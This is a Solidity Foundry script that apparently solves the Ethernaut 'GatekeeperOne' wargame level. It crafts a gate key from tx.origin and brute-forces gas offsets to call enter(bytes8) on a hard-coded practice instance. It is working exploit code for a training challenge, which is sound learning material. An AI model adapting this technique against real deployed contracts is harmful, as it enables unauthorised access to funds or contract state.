// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/Gatekeeper_one.sol";

contract Hacker {
    GatekeeperOne gateKeeperOne;

    constructor(GatekeeperOne _gateKeeperOne) {
        gateKeeperOne = _gateKeeperOne;
    }

    function attack() public {
        bytes2 originAddressLast2Bytes = bytes2(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(uint64(uint16(originAddressLast2Bytes)) + 2 ** 32);

        //*Applying brute force until we get a `true` result

        for (uint256 i = 0; i < 120; i++) {
            (bool result,) =
                address(gateKeeperOne).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

            if (result) {
                break;
            }
        }
    }
}

contract GatekeeperOneSolution is Script {
    GatekeeperOne public instance = GatekeeperOne(0xa9Ce450d56B7A7D96a55545A2AE15051E1f1C052);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("entrant:", instance.entrant());
        Hacker hacker = new Hacker(instance);
        hacker.attack();
        console.log("entrant:", instance.entrant());
        vm.stopBroadcast();
    }
}
